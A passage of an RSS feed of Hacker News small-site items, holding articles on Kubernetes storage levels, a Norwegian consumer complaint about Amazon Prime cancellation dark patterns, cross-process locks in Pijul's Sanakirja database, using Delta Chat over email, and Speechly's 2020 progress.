<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://thunderboltlaptop.com/install-xrdp-ubuntu/">https://thunderboltlaptop.com/install-xrdp-ubuntu/</a></em></p>]]>
            </description>
            <link>https://thunderboltlaptop.com/install-xrdp-ubuntu/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25790225</guid>
            <pubDate>Fri, 15 Jan 2021 12:38:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Five levels of Kubernetes storage ‚Äì meme turned into explainer]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25790188">thread link</a>) | @aceflux
<br/>
January 15, 2021 | https://www.kubenuts.com/5-levels-k8s-storage/ | <a href="https://web.archive.org/web/*/https://www.kubenuts.com/5-levels-k8s-storage/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page">
				<div id="content">
			
	<div id="primary">
		<main id="main">
			
<article id="post-2234" itemtype="https://schema.org/CreativeWork" itemscope="">
	<div>
					
			
		<div itemprop="text">
			
<div>
<div>
<h2>Introduction</h2>



<p>Don‚Äôt you love memes? Now there‚Äôs one explaining the 5 levels of storage available to Kubernetes. <em>To the right &gt;&gt;&gt;</em></p>



<p>Let‚Äôs go through a high-level overview of each level. You can then focus on the level that best matches your cluster‚Äôs needs.</p>







<h2><span data-amp-original-style="color: #ffffff;background-color: #0693e3">Level 1 ‚Äì</span><span data-amp-original-style="color: #ffffff;background-color: #ffffff">              </span><span data-amp-original-style="color: #ffffff;background-color: #0693e3">Ephemeral Storage</span></h2>



<p><strong>What is it?</strong> Default storage state of every Kubernetes cluster. Each node contains ‚Äúephemeral‚Äù storage space. </p>



<p><strong>Useful for:</strong> this is for storage of <em>temporary</em> user data within the VM. Works fine if your application doesn‚Äôt need to recall data. </p>



<p><strong>Leaves off at:</strong> now, how many apps get by with temporary storage alone?</p>
</div>



<div>
<div><figure><amp-img src="https://www.kubenuts.com/wp-content/uploads/2020/12/persistent-storage-k8s-514x1024.png" alt="" width="292" height="581" srcset="https://www.kubenuts.com/wp-content/uploads/2020/12/persistent-storage-k8s-514x1024.png 514w, https://www.kubenuts.com/wp-content/uploads/2020/12/persistent-storage-k8s-151x300.png 151w, https://www.kubenuts.com/wp-content/uploads/2020/12/persistent-storage-k8s.png 746w" sizes="(max-width: 292px) 100vw, 292px" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img loading="lazy" src="https://www.kubenuts.com/wp-content/uploads/2020/12/persistent-storage-k8s-514x1024.png" alt="" width="292" height="581" srcset="https://www.kubenuts.com/wp-content/uploads/2020/12/persistent-storage-k8s-514x1024.png 514w, https://www.kubenuts.com/wp-content/uploads/2020/12/persistent-storage-k8s-151x300.png 151w, https://www.kubenuts.com/wp-content/uploads/2020/12/persistent-storage-k8s.png 746w" sizes="(max-width: 292px) 100vw, 292px" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzU4MScgd2lkdGg9JzI5MicgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB2ZXJzaW9uPScxLjEnLz4="></amp-img><figcaption>Source: @memenetes/Twitter</figcaption></figure></div>
</div>
</div>



<h2><span data-amp-original-style="color: #ffffff;background-color: #0693e3">Level 2 ‚Äì hostPath</span></h2>



<p><strong>What is it? </strong> The first step to running a persistent (rather than temporary) volume of any kind. hostPath uses a directory to emulate network-attached storage (NAS) within the node.</p>



<p><strong>Useful for:</strong> development and testing on a single-node cluster. </p>



<p><strong>Leaves off at: </strong>you wouldn‚Äôt use this on a production cluster because of its limited reach.</p>







<h2><span data-amp-original-style="color: #ffffff;background-color: #0693e3">Level 3 ‚Äì Static Persistent Volume </span></h2>



<p><strong>What is it? </strong> Proper storage for your applications at production. Static PVs are virtual views of physical storage. Users can then request PVs using Persistent Volume Claims (PVCs).</p>



<p><strong>Useful for: </strong>when developers/operators are making simple, predictable claims for storage.</p>



<p><strong>Leaves off at: </strong>requires user‚Äôs PVC to match what‚Äôs available. Chance of mismatch is higher as needs become more complex. Nodes risk losing out on available storage.  </p>







<h2><span data-amp-original-style="color: #ffffff;background-color: #0693e3">Level 4 ‚Äì Dynamic Persistent Volume</span></h2>



<p><strong>What is it? </strong> A more robust form of Persistent Volume than the static version. Essentially automates the process of PV creation.</p>



<p><strong>Useful for: </strong>situations where PVs are created based on demand rather than the other way round. Kicks in when static PVs are unable to provide storage for a specific PVC.</p>



<p><strong>Leaves off at: </strong>it‚Äôs actually good enough for most applications. Well at least the ones that don‚Äôt get pummelled with 10s of thousands of users a day.</p>







<h2><span data-amp-original-style="color: #ffffff;background-color: #0693e3">Level 5 ‚Äì Topology-aware Volume Provisioner</span></h2>



<p><strong>What is it?</strong> Dynamic PVs are provisioned using scheduler input on the best positioning for the pod. Cuts risk of pod failure due to PV running in low CPU or memory VMs.</p>



<p>Best explained by this illustration where multiple zones are created with duplicate nodes :</p>



<figure><amp-img src="https://cloud.ibm.com/docs-content/v1/content/7a1f74245f0d26a87c73d2c1f25d2e4278f51e91/containers/images/cs_cluster_ha_roadmap_multizone_public.png" alt="" width="1664" height="606" layout="intrinsic" i-amphtml-layout="intrinsic"><img src="https://cloud.ibm.com/docs-content/v1/content/7a1f74245f0d26a87c73d2c1f25d2e4278f51e91/containers/images/cs_cluster_ha_roadmap_multizone_public.png" alt="" width="1664" height="606" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzYwNicgd2lkdGg9JzE2NjQnIHhtbG5zPSdodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZycgdmVyc2lvbj0nMS4xJy8+"></amp-img><figcaption>Image source: <a href="https://cloud.ibm.com/docs/containers?topic=containers-ha_clusters">IBM ‚Äì Provisioning your clusters for high availability </a></figcaption></figure>



<p><strong>Useful for: </strong>higher availability of applications especially in mission-critical situations. Increases fault tolerance by running workloads across several zones within a region.</p>



<p><strong>Leaves off at: </strong>nothing. This is the ultimate level of Kubernetes storage. Master it and you‚Äôve got a cluster that can handle almost any storage challenge. </p>
		</div>

				
			</div>
</article>

			

					</main>
	</div>

	

	</div>
</div></div>]]>
            </description>
            <link>https://www.kubenuts.com/5-levels-k8s-storage/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25790188</guid>
            <pubDate>Fri, 15 Jan 2021 12:34:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Amazon manipulates customers to stay subscribed]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25790161">thread link</a>) | @chillax
<br/>
January 15, 2021 | https://www.forbrukerradet.no/siste-nytt/amazon-manipulates-customers-to-stay-subscribed/ | <a href="https://web.archive.org/web/*/https://www.forbrukerradet.no/siste-nytt/amazon-manipulates-customers-to-stay-subscribed/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><span>
				14. januar, 2021			</span>
		</p><article>
							<p>Amazon puts obstacles in the way of consumers who wish to unsubscribe from its Amazon Prime service. Today the Norwegian Consumer Council filed a legal complaint against the company for breaches of the Unfair Commercial Practices Directive.</p><p>In the process of unsubscribing from Amazon Prime, the company manipulates consumers to continue using the service in what seems like a deliberate attempt to confuse and frustrate customers.</p>
<p>The Norwegian Consumer Council`s <a href="https://fil.forbrukerradet.no/wp-content/uploads/2021/01/complaint-against-amazon-prime.pdf">legal complaint</a>&nbsp;to the Consumer Protection Authority highlights what we believe to be Amazon¬¥s unfair commercial practices and breaches of marketing law.</p>
<p>‚Äì It should be as easy to end a subscription as it was to subscribe in the first place. Amazon should facilitate a good user experience instead of hindering customers and tricking them into continuing paid services they do not need or want, said Director of Digital Policy at the Norwegian Consumer Council, Finn L√ºtzow-Holm Myrstad.</p>
<p>‚Äì In our view, this practice not only betrays the expectations and trust of consumers but breaches European law.</p>
<h2><strong>One out of four consumers struggle to unsubscribe </strong></h2>
<p>The Norwegian Consumer Council <a href="https://fil.forbrukerradet.no/wp-content/uploads/2021/01/population-survey-digital-content.pdf">surveyed 1,000 Norwegian consumers</a> and analysed their experience. One out of four Norwegian consumers reported difficulties unsubscribing from digital content services. Twenty-five percent of consumers surveyed reported that they pay for one or more subscriptions that they use with such infrequency that they might as well end the subscription.</p>
<p>‚Äì Most of us use digital content services to watch movies, listen to music or audiobooks, play video games, or read the news. At the same time, many consumers experience issues with subscriptions being very easy to sign up for, but difficult to get out of, said Finn Myrstad.</p>
<p>‚Äì Companies such as Amazon seem to speculate that they can discourage customers from cancelling their subscriptions either by heavily emphasizing the benefits that will be lost upon cancellation or by making the process so complicated that its users simply give up.</p>
<h2><strong>Amazon manipulates users into staying by using dark patterns</strong></h2>
<p><iframe src="https://www.youtube-nocookie.com/embed/GpEQ4OWNO4Y" width="650" height="433" frameborder="0" allowfullscreen="allowfullscreen"></iframe></p>
<p><a href="https://fil.forbrukerradet.no/wp-content/uploads/2021/01/2021-01-14-you-can-log-out-but-you-can-never-leave-final.pdf">The Norwegian Consumer Council‚Äôs study</a> analysed the cancellation process for Amazon Prime. The analysis shows that consumers who want to leave the service are faced with a large number of hurdles, including complicated navigation menus, skewed wording, confusing choices, and repeated nudging. Throughout the process, Amazon manipulates users through wording and graphic design, making the process needlessly difficult and frustrating to understand.</p>
<p>‚Äì Unfortunately, using <em>dark patterns</em>, or manipulative design, is a common practice online. Consumers are constantly bombarded by a variety of subtle and less subtle attempts to push us into making choices that favour the companies at the cost of our own time, attention, and money, said Myrstad.</p>
<h2><strong>A global problem requires global solutions</strong></h2>
<p>16 different consumer organizations in Europe and the United States are now taking action against Amazon based on the report by the Norwegian Consumer Council. They will each ask their respective consumer authorities to investigate the use of dark patterns in their countries.</p>
<p>This international campaign builds upon the Norwegian Consumer Council‚Äôs joint 2018 campaign with seven other European consumer organizations against Google‚Äôs use of dark patterns. The complaint, which the Irish Data Protection Commissioner‚Äôs office is still investigating, uncovered how Google manipulates users into turning on comprehensive location tracking.</p>
<p>‚Äì The Consumer Protection Authority can set an important precedent by issuing a decision against Amazon. A decision in favour of the complaint would mark that the use of dark patterns is not in accordance with European law and would elevate the rights of consumers.</p>
<span><a href="https://fil.forbrukerradet.no/wp-content/uploads/2021/01/2021-01-14-you-can-log-out-but-you-can-never-leave-final.pdf">Report: You can log out but you can never leave</a></span>
							</article><div>
			<div><p><img width="650" height="381" src="https://fil.forbrukerradet.no/wp-content/uploads/2015/09/FPA_Finn_Myrstad-650x381.jpg" alt="Bilde av ansatt: Finn Myrstad" loading="lazy" srcset="https://www.forbrukerradet.no/wp-content/uploads/2015/09/FPA_Finn_Myrstad-650x381.jpg 650w, https://www.forbrukerradet.no/wp-content/uploads/2015/09/FPA_Finn_Myrstad-250x146.jpg 250w, https://www.forbrukerradet.no/wp-content/uploads/2015/09/FPA_Finn_Myrstad-120x70.jpg 120w" sizes="(max-width: 650px) 100vw, 650px" data-src="https://fil.forbrukerradet.no/wp-content/uploads/2015/09/FPA_Finn_Myrstad-650x381.jpg"></p><p>Finn Myrstad</p><p>Fagdirekt√∏r digitale tjenester</p><p>(+47) 479 66 900</p><p>finn.myrstad@forbrukerradet.no</p></div><div><p><img width="650" height="381" src="https://fil.forbrukerradet.no/wp-content/uploads/2015/09/KE_Oyvind_Herseth_Kaldestad-650x381.jpg" alt="Bilde av ansatt: √òyvind Herseth Kaldestad" loading="lazy" srcset="https://www.forbrukerradet.no/wp-content/uploads/2015/09/KE_Oyvind_Herseth_Kaldestad-650x381.jpg 650w, https://www.forbrukerradet.no/wp-content/uploads/2015/09/KE_Oyvind_Herseth_Kaldestad-250x146.jpg 250w, https://www.forbrukerradet.no/wp-content/uploads/2015/09/KE_Oyvind_Herseth_Kaldestad-120x70.jpg 120w" sizes="(max-width: 650px) 100vw, 650px" data-src="https://fil.forbrukerradet.no/wp-content/uploads/2015/09/KE_Oyvind_Herseth_Kaldestad-650x381.jpg"></p><p>√òyvind H. Kaldestad</p><p>Pressekontakt / Kommunikasjonsr√•dgiver</p><p>(+47) 480 82 619 </p><p>ohk@forbrukerradet.no</p></div>			<div><h3 id="tittel">About Amazon Prime and Dark Patterns</h3>
			<hr><p><strong>Amazon Prime</strong></p>
<p>A subscription to Amazon Prime provides discounts, shipping benefits, and access to other Amazon services. The Amazon Prime service has more than 150 million subscribers worldwide. Amazon‚Äôs European headquarters is in Luxembourg.</p>
<p><strong>Dark patterns</strong></p>
<p>Dark patterns, or manipulative design, are features of user interface design that nudge or push consumers into making choices that are in the best interest of the service provider, rather than in the interest of the consumer. This may include that certain options are easier to choose than others, that consumers are tricked into giving consent to sharing personal data, and many other practices.</p>
<p><a href="https://www.forbrukerradet.no/dark-patterns/">Se more about The Consumer Council‚Äôs work on dark patterns and cunning design.</a></p>
</div>						<p>
				<span>
					<a href="https://www.forbrukerradet.no/nyhetsvarsling">Subscribe to news in English</a>
				</span>
			</p>
		</div></div>]]>
            </description>
            <link>https://www.forbrukerradet.no/siste-nytt/amazon-manipulates-customers-to-stay-subscribed/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25790161</guid>
            <pubDate>Fri, 15 Jan 2021 12:30:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Implementing cross-process locks]]>
            </title>
            <description>
<![CDATA[
Score 33 | Comments 13 (<a href="https://news.ycombinator.com/item?id=25790132">thread link</a>) | @gbrown_
<br/>
January 15, 2021 | https://pijul.org/posts/2021-01-15-sanakirja-locks/ | <a href="https://web.archive.org/web/*/https://pijul.org/posts/2021-01-15-sanakirja-locks/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Friday, January 15, 2021</p><p>I just finished implementing a non-trivial bit of Pijul: cross-process locks for Sanakirja databases.
In this post, I explain how it works.</p><h2 id="the-problem">The problem</h2><p>Sanakirja is essentially a <a href="https://en.wikipedia.org/wiki/Copy-on-write">copy-on-write</a> collection of <a href="https://en.wikipedia.org/wiki/B-tree">B trees</a> in a file. We can start <em>mutable</em> transactions, which allow us to change the database, and can be dropped (after which the database remains unmodified) or committed, and <em>immutable</em> transactions, which only allow us to read the database.</p><p>There are a few rules to prevent race conditions: there can only be one mutable transaction started at a time, and mutable transactions cannot start if an immutable transaction started before the last commit is still active.
In other words, the following scenarios are allowed: in these drawings, the green mutable transaction starts first, and the blue transaction starts after the commit of the green one. The pink immutable transaction starts before everything else. The pink transaction can continue even after the commit of the green transaction, and will read the database as it was before the green transaction started.</p><p>However, before starting the blue transaction, we must wait for the end of the pink one.</p><p><img src="https://pijul.org/img/concurrence0.svg"></p><p>As shown in the following drawing, it does not matter whether the pink transaction was started before or after the beginning of the green one:</p><p><img src="https://pijul.org/img/concurrence1.svg"></p><p>Another notable feature of this system is that another immutable transaction (drawn in orange in the below diagram) can even be started between the two mutable transactions, in parallel to the pink transaction. In that case, the orange and pink transactions will read <em>different versions</em> of the database.
This is allowed because the orange transaction starts <em>after</em> the commit of the green one.</p><p><img src="https://pijul.org/img/concurrence2.svg"></p><h2 id="implementation-of-the-trees">Implementation of the trees</h2><p>The size of nodes in the B tree is 4096 bytes, which is the size of memory pages on most platforms (<a href="https://www.oracle.com/technetwork/server-storage/sun-sparc-enterprise/documentation/sparc-arch-2007-2516668.pdf">UltraSPARC</a> being an exception, with 8192 bytes pages).</p><p><a href="https://pirl.nvsl.io/PIRL2019-content/PIRL-2019-Andy-Rudoff.pdf">Pages are often considered to synchronise to disk <em>atomically</em></a><sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>, even though larger chunks might only be partially synchronised. This is why it is always safe to choose a smaller block size than the page size of the platform: the larger pages on UltraSPARC will be slower to synchronise, but that synchronisation will still happen atomically, thanks to disk caches.</p><p>In Sanakirja, the first page contains pointers to (1) the list of free pages and (2) a collections of at most 500 different pointers to B trees.</p><p>In a mutable transaction, existing pages are not modified: they are instead <em>copied</em> to a newly allocated page. This sounds horrible in terms of performance, but it is not that bad in practice, since we have to copy these pages to memory anyway before we can access them in the program, and write them back to disk after modifying them, and these synchronous input/output operations are much more expensive than copying page-size blocks, even on SSDs.</p><h2 id="cross-process-locks">Cross process locks</h2><p><a href="https://pijul.org/posts/2019-03-20-sanakirja-0.10/#the-concurrency-model">I wrote before about the lock model of Sanakirja</a>, but this was limited to the scope of a single process, and was relying on file locks to work, in the sense that any process using Sanakirja would first have to take an exclusive file lock, and then use the correct concurrency model between threads inside a process.</p><p>However, Pijul sometimes needs a bit more than this: for example, <a href="https://nest.pijul.com/cole-h">@cole-h</a> reported in issue <a href="https://nest.pijul.com/pijul/pijul/discussions/43">#43</a> that <code>pijul record</code> locked up other commands, which was inconvenient if you wanted to open a log while editing a change.</p><p>It is of course fundamental to prevent two records, or a record and a pull, to happen in parallel, but a full exclusive lock was clearly too much.</p><p>The system needs three atomic variables in order to work:</p><ul><li>A global clock, incremented at each commit.</li><li>A counter of active immutable transactions.</li><li>A counter of transactions active during the last commit. This is useful to make the difference between the pink and orange transactions in the drawings above.</li></ul><p>Each immutable transaction remembers the value of the clock at the time it starts, and increments the active transaction counter. When it stops, it decrements the counter of active immutable transactions, and if it started before the last commit, also decrements the counter of transactions active during the last commit.</p><p>I considered two different systems to implement this in a cross-process way:</p><ol><li><p>Reading and updating all these values at once to a file at each operation (maybe using shared memory), where the file would be protected by a lock (or a named mutex or semaphore). This sounds feasible in principle, but there is a catch: at the end of the last immutable transaction that was started before the last commit, we need a mechanism to signal to a potential mutable transaction that it can start. Between threads, this is achieved with condition variables. Between processes, this is more complicated: we could use Unix signals, but their handlers can interrupt any running function, which means that these handlers cannot take any mutex, and cannot talk to Tokio at all, which limits their usefulness.</p></li><li><p>The other option, which I ended up implementing, is to write a barebones implementation of the locking model in an external process, using Tokio tasks to model transactions, and communicate with that Tokio runtime with Unix Domain Sockets. Every time a transaction starts, it tries to connect to a Unix Domain Socket at a specified location. If that fails, a new process is forked, to run the <code>pijul lock</code> hidden command in the background (using <a href="https://doc.rust-lang.org/std/process/struct.Command.html#method.spawn">std::process::Command::spawn</a>), which opens a Unix Domain Socket and prints a new line to its standard output. The parent process waits for that newline, and then connects to the socket. The <code>pijul lock</code> command then works as follows:</p></li></ol><ul><li>The protocol implemented over the UDS has three commands (start an immutable transaction, start a mutable transaction, and commit), and two answers (called <code>ack</code> and <code>locked</code>). All these messages are encoded on one byte.</li><li>The caller use Tokio IO to wait for a response.</li><li>When the last client disconnects from the socket, <code>pijul lock</code> waits for one second, checks whether there are other clients, and then exits if there are none. This delay avoids starting instances of <code>pijul lock</code> over and over again when using pijul in a script.</li></ul><p>The source code for that new command can be seen <a href="https://nest.pijul.com/pijul/pijul:main/JL4WKA5PBKXRM.BQOAA">here on the Nest</a>, and the source code for the two kinds of transactions is available <a href="https://nest.pijul.com/pijul/pijul:main/JL4WKA5PBKXRM.UQDQA">here, also on the Nest</a>.</p><h2 id="conclusion">Conclusion</h2><p>First, this only works on Unix platforms at the moment, but it seems the equivalent of UDS on Windows <a href="https://github.com/tokio-rs/tokio/issues/2201">might be implemented soon in Tokio</a>. Pijul on Windows still relies on standard file locks.</p><p>Moreover, this is implemented in Pijul at the moment, not in Libpijul, because Libpijul is not meant to depend on Tokio in the long run (that dependency will be dropped before the beta of 1.0).</p><p>A finaly thing to note is that file locks are advisory, and so is this external process. This means that they are safe to use as long as all processes that write to the database are aware of them. However, as is the case for all files in a filesystem, a process that refuses to cooperate, and has write access to a file, will always be able to corrupt it.</p><h2 id="discussions">Discussions</h2><ul><li><a href="https://www.reddit.com/r/rust/comments/kxt19w/crossprocess_locks_between_transactions_in/">On Reddit</a></li><li><a href="https://pijul.zulipchat.com/">On Zulip</a></li></ul><section role="doc-endnotes"><hr><ol><li id="fn:1" role="doc-endnote"><p>Thanks to HackerNews user @vlowther for pointing out an oversimplification in an earlier version of this post. Sanakirja relies on the atomicity of $24 + 8r$ bytes, where $r$ is the number of ‚Äúroot‚Äù tables. In most cases, this is way less than 4Kb. When loads of tables are needed, Sanakirja can represent ‚Äútables of tables, indexed for example by an integer‚Äù (this has the Rust type <code>Db&lt;u64, Db&lt;K, V&gt;&gt;</code>), using a single root table, in which case the atomicity requirement falls down to 32 bytes. <a href="#fnref:1" role="doc-backlink">‚Ü©Ô∏é</a></p></li></ol></section></div></div>]]>
            </description>
            <link>https://pijul.org/posts/2021-01-15-sanakirja-locks/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25790132</guid>
            <pubDate>Fri, 15 Jan 2021 12:27:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Email is the messenger you should migrate to]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25790087">thread link</a>) | @galfarragem
<br/>
January 15, 2021 | https://jlelse.blog/posts/email-messenger-delta-chat | <a href="https://web.archive.org/web/*/https://jlelse.blog/posts/email-messenger-delta-chat">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><data value="https://jlelse.blog/posts/email-messenger-delta-chat"></data><div><p>Published on <time datetime="2021-01-14T17:23:36+01:00">January 14, 2021</time> in <a href="https://jlelse.blog/posts">‚úçÔ∏è Posts</a></p></div><div><p>Today I have heard again a discussion about WhatsApp, Telegram, Signal and Threema and there was the question to which messenger one would switch from WhatsApp.</p><p>While I find Telegram very pleasant as an everyday messenger, since it offers me the best user experience and also has some features (bots, channels) that other messengers don‚Äôt have, <a href="https://jlelse.blog/thoughts/2019/03/delta-chat">Delta Chat came to mind again</a>.</p><p>Everyone has an email address, email is decentralized and Delta Chat encrypts messages automatically.</p><blockquote><p>What I really like about this is, that using the existing email infrastructure enables everyone to communicate with each other without the restriction to use the same messenger or client. Anyone can choose any client and can still be connected. Just login with your usual email account. You don‚Äôt even need to use one of those messaging optimized clients and stay with your regular email client.</p><p>‚Äì <a href="https://jlelse.blog/thoughts/2019/03/delta-chat">Jan-Lukas Else (2019)</a></p></blockquote><p>I installed <a href="https://delta.chat/" target="_blank" rel="noopener">Delta Chat</a> on my smartphone again today. While the app wasn‚Äôt quite mature 2 years ago, I have to say it‚Äôs pretty decent now. The Android app seems to be based on the Signal interface. But Delta Chat is also available for desktops (Windows, macOS and Linux) and iOS. And the best part - something Signal, Threema and WhatsApp have problems with - Delta Chat can be used from multiple devices without any problems.</p><p>But the most important thing: Delta Chat allows you to communicate even with people who don‚Äôt use Delta Chat at all, all you need is an email address! If you write to someone without Delta Chat, they will just get a normal email. I would argue that even beats Matrix or XMPP.</p><p>Conclusion: If you are concerned about security when chatting and would rather use a decentralized messenger (no silo), you are in good hands with email and Delta Chat.</p><p>However, it would be advisable not to use Gmail, Outlook or GMX as email service, but a reasonable email service. I use <a href="https://www.servercow.de/mailcow?lang=en" target="_blank" rel="noopener">mailcow</a> for example, where just today there was <a href="https://mailcow.email/2021/01/14/back-to-the-future-with-delta-chat/" target="_blank" rel="noopener">an announcement about Delta Chat</a>.</p></div><p><b>Tags</b>:
<a rel="tag" href="https://jlelse.blog/tags/delta-chat">Delta Chat</a>
<a rel="tag" href="https://jlelse.blog/tags/email">Email</a>
<a rel="tag" href="https://jlelse.blog/tags/messenger">Messenger</a>
<a rel="tag" href="https://jlelse.blog/tags/opinion">Opinion</a></p></article></div></div>]]>
            </description>
            <link>https://jlelse.blog/posts/email-messenger-delta-chat</link>
            <guid isPermaLink="false">hacker-news-small-sites-25790087</guid>
            <pubDate>Fri, 15 Jan 2021 12:21:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What a team of 13 can achieve in one year in speech recognition?]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25789991">thread link</a>) | @ottomatias
<br/>
January 15, 2021 | https://www.speechly.com/blog/speechly-in-2020/ | <a href="https://web.archive.org/web/*/https://www.speechly.com/blog/speechly-in-2020/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Speechly has existed now for about for five years. We are a team of 13 experienced software developers and machine learning experts and for the most part of that five years, we‚Äôve been operating in stealth mode, focusing on building our core technologies. Now it‚Äôs time to tell what we‚Äôve achieved so far. We are building a <a href="https://www.speechly.com/develop/">developer tool</a> for improving touch screen user experience by voice functionalities. We don‚Äôt believe that smart speakers and voice assistants are the best use case for voice, but voice should be thought of as an add-on to current mobile applications‚Äô and websites‚Äô user interface. Voice is a modality, not a complete user interface.</p><p>Touch screen user interfaces definitely need improvements: while selecting from a few options is easy, selecting for example 30 items from an inventory of 20.000 is pretty cumbersome.</p><p>Typing is notoriously hard, too. Most humans speak about three times faster with less errors than they type. In short, voice is a great solution for information heavy tasks. While there are good solutions for speech recognition, there‚Äôs really no tools that would enable developers build the kind of user interfaces we‚Äôve envisioned for voice.</p><p>2020 was our first year when we really published something out in the wild. We‚Äôve built our technology for the past five years and now Speechly is finally in a stage that a developer can configure a model, integrate it to their application and build an awesome voice user interface. In this post, I‚Äôll summarize our achievements.</p><h2>1 Spoken Language Understanding accuracy matching Google</h2><p>We run our own ASR and NLU technologies that provide both transcript and meaning (intents and entities) in real-time. During the 2020 we achieved significant increases in both ASR and NLU accuracy.</p><p>We evaluate the accuracy of our engine by transcribing the data we receive with both our own and with <a href="https://cloud.google.com/speech-to-text">Google Cloud Speech API</a>. Based on our results, our Spoken Language Understanding is in a typical voice user interface task <strong>15% more accurate</strong> than Google.</p><p>Because ASR is a hard task, this is not to claim that our technology is better than Google in all cases. It means that when building voice user interfaces, Speechly outperforms Google in most cases, even without training the model separately for a certain use case.</p><p>In a real case, Speechly can further be optimized by using the actual user data for retraining the model. This improves the accuracy typically by another 10-15%.</p><h2>2 Client libraries for most important web and mobile platforms</h2><p>During the 2020, we‚Äôve published three client libraries that make integrating Speechly to an application simple and fast. Handling GRPC API, real-time audio streaming and of course parsing the results is a cumbersome task and the client libraries take most of the workload off our developers.</p><p>Our <a href="https://docs.speechly.com/client-libraries/web-client/">browser-client</a> can be used in all web applications in modern browsers and <a href="https://docs.speechly.com/client-libraries/react/">React client</a> makes development on React framework even easier.</p><p>For the iOS, we released the <a href="https://docs.speechly.com/client-libraries/ios/">iOS client</a> and our <a href="https://docs.speechly.com/client-libraries/android/">Android client</a> will be published very soon. After that, developers can easily build a unified voice user interface on all major platforms.</p><p>We have created a simple tutorial application for all of the client libraries for a gradual learning curve on all platforms.</p><h2>3 Demos showcasing our technology</h2><p>Speechly is a tool for building real-time voice functionalities that <a href="https://www.speechly.com/blog/voice-application-design-guide/">integrate seamlessly</a> to existing touch or web user interfaces.</p><p>We <a href="https://www.speechly.com/blog/real-time-voice-user-interfaces/">don‚Äôt think</a> smart speakers or "voice-only‚Äù solutions is the best way to use voice and rather advocate multimodality and real-time visual feedback.</p><p>Some of the demos we built in 2020 include a <a href="https://fashion.speechly.com/">fashion eCommerce voice search filtering</a> app and a classic <a href="https://home-automation-app-demo.herokuapp.com/">home automation</a> app. Try them out!</p><h2>4 Speechly Annotation Language features for configuring voice user interfaces</h2><p>Our Speechly Annotation Language (SAL) is a syntax we use to annotate example utterances that are used to train our models. In 2020 we added many new features to SAL:</p><ul><li>Alphanumeric sequences</li><li>Dates</li><li>Permutations</li><li>Multi-intent utterances</li><li>Variables</li><li>Canonical entities for easy handling of synonyms</li><li>Lookup tables for handling large inventories</li></ul><p>With these features, developers and designers can create complex voice user interfaces with a minimal amount of example utterances. Because the same model can be used on all platforms, the user experience is unified.</p><h2>5 Improved latency in our GRPC API</h2><p>When iPhone nailed the user experience with the touch screen, one of the key features was the very responsive user interface that reacted immediately to user input. This is a key issue also for voice user interfaces.</p><p>We‚Äôve improved our latency in 2020 significantly and now we can proudly say that our API is real-time with tail latency of under 200 milliseconds.</p><p>Low latency is the key to intuitive user experience in two ways: first, it enables user to correct themselves naturally by using voice and second, it encourages the user to go on with the voice experience.</p><p>Compare this to the traditional smart speaker user experience that first starts by uttering a wake word that sometimes fails. Once the wake word is recognized and user starts speaking, they‚Äôll know whether they were understood only after they have stopped speaking and the system has processed the input. If the answer is wrong, the user needs to start again from the beginning.</p><h2>6 Speechly Dashboard</h2><p>In March we published the first version of the Speechly Dashboard, a web application for building and configuring Spoken Language Understanding models with the Speechly Annotation Language.</p><p>The Dashboard supports nearly all Speechly features and it‚Äôs the fastest way for getting up to speed with our technology. Hundreds of developers have already created their models and tried them out in the Speechly Playground.</p><h2>7 Other achievements</h2><p>We‚Äôve also published our <a href="https://docs.speechly.com/">developer documentation</a>, many <a href="https://www.youtube.com/channel/UCvEar86D8CnD3zDJSydOdbA">videos on using our technology</a> and <a href="https://www.speechly.com/blog/configure-voice-ui-command-line/">command line tools</a> for integrating Speechly to multi-user development workflows.</p><p>We renewed our website to better position our product and hired many new developers and machine learning experts. Our founders have been interviewed in many industry leading podcasts and we were nominated as one of the Europe‚Äôs Hottest Startups.</p><p>If you want to work with us and build awesome developer tools for next-generation voice user interfaces, please check our <a href="https://www.speechly.com/careers/">careers page</a>.</p><h2>What next?</h2><p>Overall, we are pretty happy with our 2020. We‚Äôve now built a technology stack that enables efficient user interfaces that improve user experience significantly. In 2021 we focus on showing the world some cool examples of our technology.</p><p>If you are interested in staying in the loop, please subscribe to our newsletter below.</p></div></div>]]>
            </description>
            <link>https://www.speechly.com/blog/speechly-in-2020/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25789991</guid>
            <pubDate>Fri, 15 Jan 2021 12:13:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Program Eloquence Considered Harmful]]>
            </title>
            <description>
<![CDATA[
Score 35 | Comments 36 (<a href="https://news.ycombinator.com/item?id=25789837">thread link</a>) | @j-james
<br/>
